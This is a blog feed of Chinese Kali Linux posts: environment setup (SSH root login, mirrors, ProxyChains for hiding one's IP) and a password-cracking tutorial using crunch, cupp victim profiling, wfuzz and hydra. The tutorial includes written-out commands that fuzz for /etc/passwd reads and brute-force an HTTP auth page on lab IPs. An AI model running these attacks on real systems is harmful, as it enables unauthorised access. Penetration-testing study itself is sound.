        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>起因是我的kali虚拟机突然崩溃了，查了很多资料也都是推荐重装，也没有很重要的东西，但一些基本配置还是需要的</p><p>至于下载安装网上教程很多，大部分都是跟着默认选项即可。</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><p>大部分linux都是命令行模式较多，所以ssh连接也非常重要</p><h5 id="编辑ssh配置文件"><a href="#编辑ssh配置文件" class="headerlink" title="编辑ssh配置文件"></a>编辑ssh配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment"># 这里我使用的编辑器是vim 其他也可以</span></code></pre><p><img src="ssh.png" loading="lazy"></p><p>将<code>PermitRootLogin</code>后的内容改为<code>yes</code>并取消和<code>PubkeyAuthentication</code>前面的注释</p><h5 id="重启ssh服务"><a href="#重启ssh服务" class="headerlink" title="重启ssh服务"></a>重启ssh服务</h5><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh restart</code></pre><h5 id="ssh服务自启"><a href="#ssh服务自启" class="headerlink" title="ssh服务自启"></a>ssh服务自启</h5><pre class="language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span></code></pre><h5 id="ssh连接-1"><a href="#ssh连接-1" class="headerlink" title="ssh连接"></a>ssh连接</h5><p>首先使用<code>ifconfig</code>查看自己的IP地址，这里我使用的是Xshell</p><p><img src="ssh_2.png" loading="lazy"></p><p>主机填写自己查询出来的IP，端口为22(linux一般默认都是22)</p><p><img src="ssh_3.png" loading="lazy"></p><p>然后填写自己的用户密码连接</p><h4 id="更换国内镜像源"><a href="#更换国内镜像源" class="headerlink" title="更换国内镜像源"></a>更换国内镜像源</h4><p>由于某些原因，导致通过官方镜像源下载速度变慢，这时我们可以将源修改为国内的镜像源。这样做有很多好处，比如提高下载速度，提高稳定性，国内镜像源在国内访问更为顺畅，不容易出现网络波动导致的下载失败；减少延迟，访问本地镜像源可以有效减少网络延迟，提升系统更新和软件安装的效率。</p><h5 id="编辑apt配置文件"><a href="#编辑apt配置文件" class="headerlink" title="编辑apt配置文件"></a>编辑apt配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list</code></pre><h5 id="替换国内源"><a href="#替换国内源" class="headerlink" title="替换国内源"></a>替换国内源</h5><p>注释掉官方源，挑选任意源加入即可</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment"># 清华大学</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment"># 中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h5 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update  <span class="token comment"># 更新源</span><span class="token function">apt</span> upgrade <span class="token comment"># 测试镜像源</span></code></pre><h4 id="安装输入法"><a href="#安装输入法" class="headerlink" title="安装输入法"></a>安装输入法</h4><p>这里以ibus输入法为例</p><p>安装输入法框架</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ibus ibus-pinyin</code></pre><p>然后重启</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">reboot</span></code></pre><p>然后配置ibus添加中文即可</p><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>Kali中内置了ProxyChains开源代理工具，通过使用这个工具，可以让我们隐藏真实ip实现攻击、代理上网等</p><p>使用<code>ProxyChains</code>，用户可以在Kali Linux中配置不同类型的代理服务器，包括<code>HTTP</code>、<code>SOCKS4</code>和<code>SOCKS5</code>代理。此外，用户还可以为不同的目标指定不同的代理服务器，以确保他们的行为不被检测到或跟踪。</p><h5 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf</code></pre><p><img src="proxy.png" loading="lazy"></p><p>注释<code>strict_chain</code></p><p>取消<code>dynamic_chain</code>的注释</p><p>然后移至最后一行，填写对应IP和端口</p><p>我这里使用的是clash for Windows，虚拟机采用NAT连接</p><p>首先在Windows cmd下<code>ipconfig</code>，查询NAT模式的IP</p><p><img src="proxy_2.png" loading="lazy"></p><p><img src="proxy_3.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">socks4 <span class="token number">192.168</span>.2.1 <span class="token number">7890</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字典生成与密码爆破</title>
      <link href="/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="字典生成工具"><a href="#字典生成工具" class="headerlink" title="字典生成工具"></a>字典生成工具</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><pre class="language-http" data-language="http"><code class="language-http"># 源码<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//github.com/crunchsec/crunch</span></span></code></pre><p><strong>Crunch</strong>为<strong>kali</strong>自带工具之一，是一种自定义创建密码字典工具，按照指定的规则生成密码字典，可以针对性的生成字典文件</p><h5 id="使用语法和参数"><a href="#使用语法和参数" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token operator">&lt;</span>min<span class="token operator">></span> <span class="token operator">&lt;</span>max<span class="token operator">></span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span></code></pre><p>参数详解</p><pre class="language-bash" data-language="bash"><code class="language-bash">min    设定最小字符串长度（必选）max    设定最大字符串长度（必选）oprions<span class="token parameter variable">-b</span>     指定文件输出的大小，避免字典文件过大  <span class="token parameter variable">-c</span>     指定文件输出的行数，即包含密码的个数<span class="token parameter variable">-d</span>     限制相同元素出现的次数<span class="token parameter variable">-e</span>     定义停止字符，即到该字符串就停止生成<span class="token parameter variable">-f</span>     调用库文件（/etc/share/crunch/charset.lst）<span class="token parameter variable">-i</span>     改变输出格式，即aaa,aab -<span class="token operator">></span> aaa,baa<span class="token parameter variable">-I</span>     通常与-t联合使用，表明该字符为实义字符<span class="token parameter variable">-m</span>     通常与-p搭配<span class="token parameter variable">-o</span>     将密码保存到指定文件<span class="token parameter variable">-p</span>     指定元素以组合的方式进行<span class="token parameter variable">-q</span>     读取密码文件，即读取pass.txt<span class="token parameter variable">-r</span>     定义重某一字符串重新开始<span class="token parameter variable">-s</span>     指定一个开始的字符，即从自己定义的密码xxxx开始<span class="token parameter variable">-t</span>     指定密码输出的格式<span class="token parameter variable">-u</span>     禁止打印百分比（必须为最后一个选项）<span class="token parameter variable">-z</span>     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </code></pre><p>特殊字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">%      代表数字^      代表特殊符号@      代表小写字母,      代表大写字符   </code></pre><h5 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h5><p>1.生成最小为5,最大为6，用自己指定的字符abcdef(默认为26个小写字母为元素的所有组合)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdef</code></pre><p>2.生成最小为5,最大为6，由abcdefg和空格为元素的所有组合(&#x2F;代表空格)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdefg\ 或者 crunch <span class="token number">5</span> <span class="token number">6</span> <span class="token string">"abcdefg "</span></code></pre><p>3.多种组合 生成3个元素的组合，前三位为定义的字符串</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">3</span> <span class="token number">3</span> <span class="token parameter variable">-t</span> d@% <span class="token parameter variable">-p</span> aaa bbb </code></pre><p>4.生成几个元素的组合（可以用于社工中收集的信息）</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token operator">-</span>p zhangsan <span class="token number">2018</span> <span class="token number">0101</span> <span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>5.生成指定的字符串（比如生成编号，手机号等）</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">10</span> <span class="token number">10</span> <span class="token operator">-</span>t <span class="token number">201800</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span></code></pre><p><img src="crunch.png" loading="lazy"></p><p>6.通过-l参数来使@,%^等特殊字符输出</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> <span class="token parameter variable">-t</span> p@ss,%^ <span class="token parameter variable">-l</span> a@aaaaa</code></pre><p>7.-o参数也可使用&gt;&gt;来简化</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-d</span> <span class="token number">2</span>@ <span class="token parameter variable">-t</span> @@@% <span class="token operator">>></span> test.txt</code></pre><h5 id="调用密码库"><a href="#调用密码库" class="headerlink" title="调用密码库"></a>调用密码库</h5><p><img src="crunch_2.png" loading="lazy"></p><p>特殊字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">numeric     表示0123456789Lalpha      表示26位小写字母Ualpha      表示26位大写字母</code></pre><p>实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> charset.lst hex-upper <span class="token parameter variable">-t</span> @@%% <span class="token parameter variable">-l</span> @aaa</code></pre><h4 id="cupp-ccupp"><a href="#cupp-ccupp" class="headerlink" title="cupp(ccupp)"></a>cupp(ccupp)</h4><h5 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h5><p>cupp是一款基于python编写的可交互性的密码字典生成工具。结合社会工程学，你会获得一份根据个人信息生成的专属字典。</p><p>与传统字典相比，其优势在于准确率更高</p><h5 id="cupp常用命令"><a href="#cupp常用命令" class="headerlink" title="cupp常用命令"></a>cupp常用命令</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span>常看帮助信息<span class="token parameter variable">-i</span>通过填写信息创建用户密码字典<span class="token parameter variable">-w</span>在已存在的字典进行扩展<span class="token parameter variable">-l</span>从github仓库下载字典<span class="token parameter variable">-v</span>查看版本信息<span class="token parameter variable">-q</span>安静模式</code></pre><h5 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h5><ol><li><p>运行命令”cupp -i”,填写受害人姓、名、绰号、生日。</p></li><li><p>填写受害人配偶的名字、绰号、生日</p></li><li><p>填写孩子的名字、绰号、生日</p></li><li><p>填写宠物的名字以及公司的名字</p></li><li><p>是否添加一些关于受害人的关键词</p></li><li><p>是否在密码结尾添加一些特殊字符</p></li><li><p>是否在密码结尾添加一些随机数字</p></li><li><p>填写”y”，生成字典，可以在root目录下查看</p></li></ol><p>运行命令 “cupp -l” ,填写你想要下载字典的序号，下载完成的字典保存在”&#x2F;root&#x2F;dictionaries&#x2F;chinese”目录下。</p><h3 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h3><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p><a href="https://www.freebuf.com/column/163553.html">史上最详[ZI]细[DUO]的wfuzz中文教程（一）——初识wfuzz</a></p><p><a href="https://www.ddosi.org/wfuzz-guide/">Wfuzz详细指南|模糊测试工具使用方法</a></p><h5 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h5><p>wfuzz 是一款Python开发的Web安全测试工具<br>wfuzz不仅仅是一个web扫描器：</p><ul><li>wfuzz能够通过发现并利用网站弱点&#x2F;漏洞的方式帮助你使网站更加安全。wfuzz的漏洞扫描功能由插件支持。</li><li>wfuzz是一个完全模块化的框架，这使得即使是Python初学者也能够进行开发和贡献代码。开发一个wfuzz插件是一件非常简单的事，通常只需几分钟。</li><li>wfuzz提供了简洁的编程语言接口来处理wfuzz或Burpsuite获取到的HTTP请求和响应。这使得你能够在一个良好的上下文环境中进行手工测试或半自动化的测试，而不需要依赖web形式的扫描器。</li></ul><h5 id="使用语法和参数-1"><a href="#使用语法和参数-1" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><pre class="language-javascript" data-language="javascript"><code class="language-javascript">选项：<span class="token operator">-</span>h<span class="token operator">/</span><span class="token operator">--</span>help：帮助<span class="token operator">--</span>help：高级帮助<span class="token operator">--</span>filter<span class="token operator">-</span>help：筛选器帮助<span class="token operator">--</span>version：Wfuzz版本详细信息<span class="token operator">-</span>e＜type＞：可用编码器<span class="token operator">/</span>有效负载<span class="token operator">/</span>迭代器<span class="token operator">/</span>打印机<span class="token operator">/</span>脚本列表<span class="token operator">--</span>recipe＜filename＞：从配方中读取选项。对各种食谱重复上述步骤。<span class="token operator">--</span>dump recipe＜filename＞：将当前选项打印为配方<span class="token operator">--</span>oF＜filename＞：将模糊结果保存到文件中。这些可以稍后使用wfuzz有效负载来使用。<span class="token operator">-</span>c：带颜色的输出<span class="token operator">-</span>v：详细信息。<span class="token operator">-</span>f filename，printer：使用指定的打印机（如果省略了原始打印机）将结果存储在输出文件中。<span class="token operator">-</span>o printer：使用指定的打印机显示结果。<span class="token operator">--</span>interact<span class="token operator">:</span>（beta）如果选中，则捕获所有按键。这允许您与程序交互。<span class="token operator">--</span>dry<span class="token operator">-</span>run：打印应用请求的结果，而不实际发出任何<span class="token constant">HTTP</span>请求。<span class="token operator">--</span>prev：打印以前的<span class="token constant">HTTP</span>请求（仅当使用生成模糊结果的有效负载时）<span class="token operator">--</span>efield＜expr＞：显示指定的语言表达式以及当前负载。对各个字段重复上述操作。<span class="token operator">--</span>field＜expr＞：不显示有效负载，只显示指定的语言表达式。对各个字段重复上述操作。<span class="token operator">-</span>p addr：使用ip<span class="token operator">:</span>port<span class="token operator">:</span>type格式的代理。重复使用各种代理的选项。如果省略，类型可以是<span class="token constant">SOCKS4</span>、<span class="token constant">SOCKS5</span>或<span class="token constant">HTTP</span>。<span class="token operator">-</span>t <span class="token constant">N</span>：指定并发连接数（默认值为<span class="token number">10</span>）<span class="token operator">-</span>s <span class="token constant">N</span>：指定请求之间的时间延迟（默认值为<span class="token number">0</span>）<span class="token operator">-</span><span class="token constant">R</span> depth：递归路径发现深度是最大递归级别。<span class="token operator">-</span><span class="token constant">D</span> depth：最大链接深度级别。<span class="token operator">-</span><span class="token constant">L</span><span class="token punctuation">,</span> <span class="token operator">--</span>follow<span class="token operator">:</span>遵循<span class="token constant">HTTP</span>重定向<span class="token operator">--</span>ip<span class="token operator">-</span>host<span class="token operator">:</span>port：以ip<span class="token operator">:</span>port格式指定要连接的ip，而不是<span class="token constant">URL</span>的主机<span class="token operator">-</span><span class="token constant">Z</span>：扫描模式（将忽略连接错误）。<span class="token operator">--</span>req delay <span class="token constant">N</span>：设置请求允许的最长时间（以秒为单位）（<span class="token constant">CURLOPT_TIMEOUT</span>）。默认值<span class="token number">90</span>。<span class="token operator">--</span>conn<span class="token operator">-</span>delay <span class="token constant">N</span>：设置服务器连接阶段要花费的最长时间（以秒为单位）（<span class="token constant">CURLOPT_CONNECTTIMEOUT</span>）。默认值<span class="token number">90</span>。<span class="token operator">-</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AA</span><span class="token punctuation">,</span> <span class="token operator">--</span><span class="token constant">AAA</span><span class="token operator">:</span> <span class="token operator">--</span>script<span class="token operator">=</span><span class="token keyword">default</span>，verbose，discovery<span class="token operator">-</span>v<span class="token operator">-</span>c的别名<span class="token operator">--</span>no<span class="token operator">-</span>cache：禁用插件缓存。将扫描每个请求。<span class="token operator">--</span>script<span class="token operator">=</span>：相当于<span class="token operator">--</span>script<span class="token operator">=</span>默认值<span class="token operator">--</span>script<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>：运行脚本的扫描<span class="token operator">&lt;</span>plugins<span class="token operator">></span>是以逗号分隔的插件文件或插件类别列表<span class="token operator">--</span>script help<span class="token operator">=</span><span class="token operator">&lt;</span>plugins<span class="token operator">></span>：显示有关脚本的帮助。<span class="token operator">--</span>script<span class="token operator">-</span>args n1<span class="token operator">=</span>v1，…：为脚本提供参数。即<span class="token operator">--</span>script args grep<span class="token punctuation">.</span>regex<span class="token operator">=</span>“<span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span>\”（<span class="token punctuation">.</span><span class="token operator">*</span>？）\“<span class="token operator">></span>”<span class="token operator">-</span>u url：指定请求的url。<span class="token operator">-</span>m iterator：指定用于组合有效载荷的迭代器（默认为product）<span class="token operator">-</span>z payload：以名称<span class="token punctuation">[</span>，参数<span class="token punctuation">]</span><span class="token punctuation">[</span>，编码器<span class="token punctuation">]</span>的形式为每个<span class="token constant">FUZZ</span>关键字指定有效负载。可以使用编码器列表，即md5<span class="token operator">-</span>sha1。编码器可以是链式的，即。md5@sha1<span class="token punctuation">.</span>可以使用编码器类别。即url使用帮助作为有效负载来显示有效负载插件的详细信息（您可以使用<span class="token operator">--</span>slice进行过滤）<span class="token operator">--</span>zP＜params＞：指定有效负载的参数（必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>zD<span class="token operator">&lt;</span><span class="token keyword">default</span><span class="token operator">></span>：指定有效负载的默认参数（必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>zE＜encoder＞：指定有效负载的编码器（它必须以<span class="token operator">-</span>z或<span class="token operator">-</span>w开头）。<span class="token operator">--</span>slice＜filter＞：使用指定的表达式过滤有效负载的元素。它必须以<span class="token operator">-</span>z开头。<span class="token operator">-</span>w wordlist：指定wordlist文件（<span class="token operator">-</span>z文件的别名，wordlist）。<span class="token operator">-</span><span class="token constant">V</span> alltype：所有参数brutforming（allvars和allpost）。不需要<span class="token constant">FUZZ</span>关键字。<span class="token operator">-</span><span class="token constant">X</span> method：指定请求的<span class="token constant">HTTP</span>方法，即<span class="token constant">HEAD</span>或<span class="token constant">FUZZ</span><span class="token operator">-</span>b cookie：为请求指定cookie。对各种cookie重复选项。<span class="token operator">-</span>d postdata：使用postdata（例如：“id<span class="token operator">=</span><span class="token constant">FUZZ</span><span class="token operator">&amp;</span>catalog<span class="token operator">=</span><span class="token number">1</span>”）<span class="token operator">-</span><span class="token constant">H</span> <span class="token literal-property property">header：使用header（例如：“Cookie</span><span class="token operator">:</span>id<span class="token operator">=</span><span class="token number">1312321</span><span class="token operator">&amp;</span>user<span class="token operator">=</span><span class="token constant">FUZZ</span>”）。对各种标题重复选项。<span class="token operator">--</span>basic<span class="token operator">/</span>ntlm<span class="token operator">/</span>digest auth：格式为“user<span class="token operator">:</span>pass”或“<span class="token constant">FUZZ</span><span class="token operator">:</span><span class="token constant">FUZZ</span>”或<span class="token operator">--</span>hc<span class="token operator">/</span>hl<span class="token operator">/</span>hw<span class="token operator">/</span>hh <span class="token constant">N</span><span class="token punctuation">[</span>，<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>：隐藏具有指定代码<span class="token operator">/</span>行<span class="token operator">/</span>字<span class="token operator">/</span>字符的响应（使用<span class="token constant">BBB</span>从基线获取值）<span class="token operator">--</span>sc<span class="token operator">/</span>sl<span class="token operator">/</span>sw<span class="token operator">/</span>sh <span class="token constant">N</span><span class="token punctuation">[</span>，<span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">+</span>：显示具有指定代码<span class="token operator">/</span>行<span class="token operator">/</span>字<span class="token operator">/</span>字符的响应（使用<span class="token constant">BBB</span>获取基线值）<span class="token operator">--</span>ss<span class="token operator">/</span>hs正则表达式：显示<span class="token operator">/</span>隐藏内容中具有指定正则表达式的响应<span class="token operator">--</span>filter＜filter＞：使用指定的筛选器表达式显示<span class="token operator">/</span>隐藏响应（使用<span class="token constant">BBB</span>从基线获取值）<span class="token operator">--</span>prefilter＜filter＞：使用指定的表达式在模糊化之前过滤项目。对串联过滤器重复上述步骤。</code></pre><h5 id="wfuzz常见用法"><a href="#wfuzz常见用法" class="headerlink" title="wfuzz常见用法"></a>wfuzz常见用法</h5><hr><h6 id="模糊查询GET请求参数"><a href="#模糊查询GET请求参数" class="headerlink" title="模糊查询GET请求参数"></a>模糊查询GET请求参数</h6><pre class="language-none"><code class="language-none">wfuzz -u &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;test.php?FUZZ&#x3D;&#x2F;etc&#x2F;passwd&quot; -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hh 80</code></pre><p><img src="wfuzz.png" loading="lazy"></p><h6 id="模糊查询POST请求参数"><a href="#模糊查询POST请求参数" class="headerlink" title="模糊查询POST请求参数"></a>模糊查询POST请求参数</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -d &quot;uname&#x3D;FUZZ&amp;pass&#x3D;FUZZ&quot;  --hc 302 http:&#x2F;&#x2F;192.168.1.102&#x2F;user.php</code></pre><h6 id="添加cookie发起请求"><a href="#添加cookie发起请求" class="headerlink" title="添加cookie发起请求"></a>添加cookie发起请求</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -b cookie&#x3D;value1 -b cookie2&#x3D;value2 http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -H &quot;Referer: 127.0.0.1&quot; http:&#x2F;&#x2F;192.168.1.102&#x2F;FUZZ</code></pre><h6 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h6><pre class="language-none"><code class="language-none">wfuzz -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</code></pre><p><img src="wfuzz_2.png" loading="lazy"></p><h6 id="爆破401认证界面"><a href="#爆破401认证界面" class="headerlink" title="爆破401认证界面"></a>爆破401认证界面</h6><pre class="language-none"><code class="language-none">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --basic mum:FUZZ -u http:&#x2F;&#x2F;192.168.1.106:631&#x2F;admin&#x2F; -b &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&quot; -d &quot;org.cups.sid&#x3D;f607a41978fbca423d4de60f686fe8f5&amp;OP&#x3D;add-printer&quot; -Z --hc 401</code></pre><p><img src="wfuzz_3.png" loading="lazy"></p><h4 id="hydra-九头蛇"><a href="#hydra-九头蛇" class="headerlink" title="hydra(九头蛇)"></a>hydra(九头蛇)</h4><h5 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h5><p>Hydra是一个暴力在线密码破解程序，一个针对系统登录密码的快速爆破工具。</p><p>我们可以使用Hydra运行一个字典并”暴力破解”一些身份验证服务，想象一下试图在特定服务上手动猜测某人的密码（SSH, Web应用程序登录框, FTP，SNMP），使用 Hydra 运行密码字典以确定正确的密码。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Hydra能够尝试暴力破解以下协议：</span>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle监听器, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP枚举, SNMP v1+v2+v3, SOCKS5, SSH <span class="token punctuation">(</span>v1和v2<span class="token punctuation">)</span>, SSHKEY, Subversion, Teamspeak <span class="token punctuation">(</span>TS2<span class="token punctuation">)</span>, Telnet, VMware-Auth, VNC以及XMPP等。</code></pre><h5 id="使用语法和参数-2"><a href="#使用语法和参数-2" class="headerlink" title="使用语法和参数"></a>使用语法和参数</h5><p>语法：hydra [-Options] [IP] [service]</p><p>Example:  hydra -l user -P passlist.txt <a href="ftp://192.168.0.1/">ftp://192.168.0.1</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-l</span> login 小写，指定用户名进行破解<span class="token parameter variable">-L</span> <span class="token function">file</span> 大写，指定用户的用户名字典<span class="token parameter variable">-p</span> pass 小写，用于指定密码破解，很少使用，一般采用密码字典。<span class="token parameter variable">-P</span> <span class="token function">file</span> 大写，用于指定密码字典。<span class="token parameter variable">-e</span> ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探<span class="token parameter variable">-M</span> <span class="token function">file</span> 指定目标ip列表文件，批量破解。<span class="token parameter variable">-o</span> <span class="token function">file</span> 指定结果输出文件<span class="token parameter variable">-f</span> 找到第一对登录名或者密码的时候中止破解。<span class="token parameter variable">-t</span> tasks 同时运行的线程数，默认是16<span class="token parameter variable">-w</span> <span class="token function">time</span> 设置最大超时时间，单位<span class="token parameter variable">-v</span> / <span class="token parameter variable">-V</span> 显示详细过程<span class="token parameter variable">-R</span> 恢复爆破（如果破解中断了，下次执行 hydra <span class="token parameter variable">-R</span> /path/to/hydra.restore 就可以继续任务。）<span class="token parameter variable">-x</span> 自定义密码。</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">service：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。注意点：<span class="token number">1</span>.自己创建字典,然后放在当前的目录下或者指定目录。<span class="token number">2</span>.参数可以统一放在最后，格式比如hydra <span class="token function">ip</span> 服务 参数。<span class="token number">3</span>.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。<span class="token number">4</span>.缺点，如果目标网站登录时候需要验证码就无法破解。<span class="token number">5</span>.man hydra最万能。<span class="token number">6</span>.或者hydra <span class="token parameter variable">-U</span> http-form等查看具体帮助。</code></pre><h5 id="Kail字典"><a href="#Kail字典" class="headerlink" title="Kail字典"></a>Kail字典</h5><p>在kail中是自带字典的，可以通过&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb路径进行查看，当然都是txt文件，也可以自己向里面添加。</p><table><thead><tr><th>文件名</th><th>介绍</th></tr></thead><tbody><tr><td>big.txt</td><td>大的字典</td></tr><tr><td>small.txt</td><td>小的字典</td></tr><tr><td>catala.txt</td><td>项目配置字典</td></tr><tr><td>common.txt</td><td>公共字典</td></tr><tr><td>euskera.txt</td><td>数据目录字典</td></tr><tr><td>extensions_common.txt</td><td>常用文件扩展名字典</td></tr><tr><td>indexes.txt</td><td>首页字典</td></tr><tr><td>mutations_common.txt</td><td>备份扩展名</td></tr><tr><td>spanish.txt</td><td>方法名或库目录</td></tr><tr><td>others</td><td>扩展目录，默认用户名、默认密码等</td></tr><tr><td>stress</td><td>压力测试</td></tr><tr><td>vulns</td><td>漏洞测试</td></tr></tbody></table><h5 id="Hydra密码生成器"><a href="#Hydra密码生成器" class="headerlink" title="Hydra密码生成器"></a>Hydra密码生成器</h5><table><thead><tr><th>参数</th><th>介绍</th></tr></thead><tbody><tr><td>-x MIN:MAX:CHARSET 密码暴力破解生成器</td><td>规则：MIN表示生成密码的最短长度；MAX表示生成密码的最长长度；CHARSET表示使用指定的字符生成密码，’a’表示所有的小写字母，’A’表示所有的大写字母,’1’表示所有的数字，对于其他字符，只需要添加在后面即可</td></tr><tr><td>-y</td><td>使用方式见-x，它表示charset的字符是实际的字符，而不是正则表达式</td></tr><tr><td>-x 3:5:a</td><td>生成的密码字典长度为3到5位，由所有的小写字母组成</td></tr><tr><td>-x 5:8:A1</td><td>生成的密码字典长度为5到8位，有所有的大写字母和数字组成</td></tr><tr><td>-x 5:5&#x2F;%,.-</td><td>生成的密码字典长度为5位，只由’&#x2F; % , . -‘这5种字符构成</td></tr><tr><td>-x 